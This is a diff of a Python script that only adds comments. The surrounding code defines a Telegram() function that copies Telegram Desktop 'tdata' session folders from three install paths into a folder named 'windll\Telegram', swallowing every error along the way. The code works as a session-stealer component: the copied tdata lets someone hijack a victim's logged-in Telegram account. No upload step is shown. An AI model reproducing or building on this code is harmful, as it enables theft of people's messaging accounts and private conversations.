@@ -11,7 +11,9 @@
 #-----------------------------------------------------------------------------#
 import os
 import shutil
-
+"""
+all needed paths
+"""
 path1 = 'D:\\Telegram Desktop\\tdata'
 path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
 path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'
@@ -25,18 +27,18 @@ def Telegram():
         directory = rf'{pathtofile}\windll\Telegram'
         shutil.copytree(path1,
                 directory,
-                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
     except:
         pass
     try:
         shutil.copytree(path2,
                 directory,
-                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
     except:
         pass
     try:
         shutil.copytree(path3,
                 directory,
-                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
     except:
         pass
